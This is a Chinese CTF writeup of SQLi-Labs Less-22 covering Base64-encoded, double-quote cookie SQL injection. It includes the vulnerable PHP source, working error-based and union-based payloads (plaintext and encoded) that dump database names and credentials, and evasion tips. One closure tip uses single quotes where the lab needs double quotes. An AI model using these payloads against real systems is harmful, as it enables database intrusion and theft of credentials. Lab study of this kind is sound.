【SQLi-Labs】Less-22 Base64 编码与双引号 Cookie 注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.25 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, Cookie注入, Base64, 源码审计

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-22 (Cookie Injection - Error Based - complex - string)
  • 提示：Cookie 注入，Base64 编码，双引号闭合

2. 源码分析与原理

根据本地源码审计，Less-22 的核心逻辑如下：

$cookee  = base64_decode($cookee);       // 先 base64 解码
$cookee1 = '"'. $cookee. '"';            // 再套双引号
$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";

原理分析：

  • 服务器在接收 Cookie 后，会先进行 Base64 解码，再将其用双引号 "" 包裹。因此，Payload 必须进行 Base64 编码，且闭合符为双引号 "。
  • 登录框的 POST 请求使用了 check_input() 函数（包含 mysql_real_escape_string）无法注入。真正的注入点在 Cookie。
  • 错误信息通过 die('Issue with your mysql: '.mysql_error()) 直接回显。

3. 操作步骤与解析

第一步：获取初始 Cookie 并抓包

使用 admin/123456 登录，刷新页面，在 Burp Suite 中抓取 GET /sqli-labs-master/Less-22/ 请求。观察到 Cookie: uname=YWRtaW4=（即 admin 的 Base64 编码）。

第二步：构造 Payload 并编码

利用 Burp 的 Decoder 模块，将 Payload 转为 Base64 格式。注意：若生成的 Base64 字符串包含 +，PHP 会将其解析为空格，需要手动替换为 %2B。

报错注入（拿库名）：

明文：1" and extractvalue(1,concat(0x7e,database()))#
Base64：MSIgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpKSM=

将编码后的值填入 Cookie 发送，页面回显 XPATH syntax error: '~security~'。

联合查询（直接脱库）：

明文：-1" union select 1,group_concat(username,0x3a,password),3 from users#
Base64：LTEiIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdCh1c2VybmFtZSwweDNhLHBhc3N3b3JkKSwzIGZyb20gdXNlcnMj

将编码后的值填入 Cookie 发送，页面直接渲染出所有账号密码（如 Dumb:Dumb,Angelina:I-kill-you...）。

4. 踩坑记录与复盘

  • 黑名单拦截：若 Payload 中包含 or 或 updatexml，可能会触发靶场预设的黑名单，导致页面直接显示 BUG OFF YOU SILLY DUMB HACKER。此时应换用 extractvalue 函数进行报错注入。
  • Base64 传输问题：Base64 编码后的 + 号在 HTTP 传输中极易被 PHP 解析为空格，导致解码失败。实战中需将 + 替换为 URL 编码的 %2B。
  • 注释符的选择：在 Cookie 头部中，# 号如果后面没有空格，可能无法被 MySQL 识别为注释。此时可以使用 -- -，或者直接放弃注释符，采用对称闭合（如 and '1'='1 补齐尾部引号）。

5. 知识点总结

  • 源码审计驱动：通过白盒审计（查看 PHP 源码）能够最直接地了解数据的流转和过滤逻辑，精准构造 Payload。
  • Base64 编码注入：面对数据被 Base64 编码的服务端，Payload 的构造必须与后端的解码逻辑对齐。
